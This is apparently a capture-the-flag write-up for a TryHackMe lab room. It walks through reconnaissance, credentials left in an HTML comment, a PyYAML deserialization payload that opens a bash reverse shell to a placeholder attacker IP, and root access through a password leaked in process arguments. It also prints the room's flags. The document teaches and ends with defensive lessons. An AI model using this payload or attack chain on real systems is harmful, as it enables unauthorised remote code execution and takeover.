# 🏖️ Beach Bar — TryHackMe Hacker Holidays 2026

> **Day 5 of the Hacker Holidays 2026 event**
> Category: Web + Boot2Root | Difficulty: Medium

---

## 📋 Room Summary

| Field | Details |
|---|---|
| **Room Name** | Beach Bar |
| **Room ID** | hh-beachbar-d849f7f7 |
| **Difficulty** | Medium |
| **Type** | Web Exploitation + Boot2Root |
| **Target IP** | 10.48.185.133 |
| **Attack Vector** | PyYAML Deserialization RCE |
| **Privilege Escalation** | Password leak via `ps aux` |
| **User Flag** | `THM{y4ml_pl4yl1st_pwns_th3_b34ch}` |
| **Root Flag** | ✅ Captured |

---

## 🗺️ Attack Chain Overview

```
Nmap Scan
    └─► Port 22 (SSH) + Port 80 (HTTP)
            └─► Gobuster
                    └─► /login, /import, /export, /dashboard
                            └─► HTML Source Review
                                    └─► Credentials: dj:dj (in comment)
                                            └─► Login → Download YAML playlist
                                                    └─► Craft Malicious YAML (PyYAML RCE)
                                                            └─► Reverse Shell as bartender
                                                                    └─► User Flag ✅
                                                                            └─► ps aux → root password leaked
                                                                                    └─► su root → Root Flag ✅
```

---

## 🔍 Step-by-Step Walkthrough

### Step 1: Reconnaissance — Nmap

```bash
nmap -T4 -F -Pn 10.48.185.133
```

**Result:**
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Two open ports — SSH and HTTP. We start by exploring the web service.

---

### Step 2: Directory Enumeration — Gobuster

```bash
gobuster dir -u http://10.48.185.133 -w /usr/share/wordlists/dirb/common.txt
```

**Found endpoints:**
| Endpoint | Status | Notes |
|---|---|---|
| `/login` | 200 | Login page |
| `/dashboard` | 302 | Redirects to /login |
| `/import` | 302 | Redirects to /login |
| `/export` | 302 | Redirects to /login |
| `/logout` | 302 | Redirects to / |

---

### Step 3: Credential Discovery in HTML Source

Fetching the login page source revealed developer credentials left in an **HTML comment**:

```bash
curl http://10.48.185.133/login
```

```html
<!-- 
  staff note: the demo DJ login is still enabled for the soft opening.
  dj / dj  — swap this before the season starts (ticket BAR-7)
-->
```

> 💡 **Vulnerability:** Sensitive credentials left in client-side HTML comments before deployment.

**Credentials found:** `dj : dj`

---

### Step 4: Login and YAML Export

After logging in with `dj:dj`, the dashboard shows a jukebox management interface. Using the **Export** function downloads a YAML playlist file revealing the expected format:

```yaml
# Beach Bar jukebox playlist export
playlist:
  name: Sunset Session
  vibe: golden hour
  tracks:
    - artist: Khruangbin
      title: Maria Tambien
    - artist: Men I Trust
      title: Show Me How
    - artist: Crumb
      title: Locket
```

---

### Step 5: PyYAML Injection — Remote Code Execution

The `/import` endpoint accepts YAML files and parses them using **PyYAML's unsafe loader**, which allows arbitrary Python object instantiation via `!!python/object` tags.

**Malicious YAML payload (`evil.yaml`):**

```yaml
# Beach Bar jukebox playlist export
playlist:
  name: !!python/object/apply:os.system
    args: ['bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"']
  vibe: golden hour
  tracks:
    - artist: Khruangbin
      title: Maria Tambien
```

**Steps to exploit:**

```bash
# 1. Find your TryHackMe VPN IP
ip a show tun0

# 2. Start a netcat listener
nc -lvnp 4444

# 3. Create evil.yaml with your IP
nano evil.yaml

# 4. Login at http://10.48.185.133 with dj:dj
# 5. Navigate to /import and upload evil.yaml
```

**Shell received:**
```
connect to [192.168.187.58] from (UNKNOWN) [10.48.140.114] 45494
bash: no job control in this shell
bartender@tryhackme-2404:/opt/beach-bar/webapp$
```

> 💡 **Vulnerability:** `yaml.load()` without `Loader=yaml.SafeLoader` enables arbitrary code execution via Python object tags.

---

### Step 6: User Flag

```bash
cat /home/bartender/user.txt
```

```
THM{y4ml_pl4yl1st_pwns_th3_b34ch}
```

---

### Step 7: Privilege Escalation — Password Leak via `ps aux`

Enumerating running processes revealed the `jukeboxd` service running as **root** with its password visible in the command-line arguments:

```bash
ps aux | grep jukebox
```

```
root  608  0.0  0.2  20176 11688 ?  Ss  09:25  0:00 /opt/beach-bar/venv/bin/python 
      /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k
```

> 💡 **Vulnerability:** Passing passwords as command-line arguments exposes them to all users via `ps aux`.

**Password found:** `SunsetSpritz2024!`

This password was **reused as the root account password**:

```bash
su root
# Password: SunsetSpritz2024!
```

---

### Step 8: Root Flag

```bash
cat /root/root.txt
```

Root flag captured! 🎉

---

## 🧠 Vulnerabilities Summary

| # | Vulnerability | Severity | Location |
|---|---|---|---|
| 1 | Hardcoded credentials in HTML comment | High | `/login` source |
| 2 | PyYAML unsafe deserialization (RCE) | Critical | `/import` endpoint |
| 3 | Password exposed in process arguments | High | `jukeboxd` service |
| 4 | Password reuse (service → root) | Critical | System configuration |

---

## 🛡️ Lessons Learned

1. **Never store credentials in HTML comments** — always audit source code before deployment.
2. **PyYAML's `yaml.load()` is dangerous** — always use `yaml.safe_load()` which disallows Python object tags.
3. **Never pass secrets as CLI arguments** — they appear in `ps aux` and `/proc/*/cmdline` for all users to see.
4. **Password reuse is critical** — service passwords should never match system account passwords.
5. **Validate and sanitize all file uploads** — especially serialization formats like YAML, JSON, and XML.

---

## 🔧 Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Port scanning |
| `gobuster` | Directory enumeration |
| `curl` | HTTP requests and source inspection |
| `nano` | Creating malicious YAML payload |
| `nc` (netcat) | Reverse shell listener |
| `ps aux` | Process enumeration |

---

## 📁 Files

| File | Description |
|---|---|
| `Beach_Bar_Writeup.pdf` | Full writeup with screenshots |
| `evil.yaml` | Malicious YAML payload (for educational use) |

---

*Writeup by Gaurav | TryHackMe Hacker Holidays 2026*
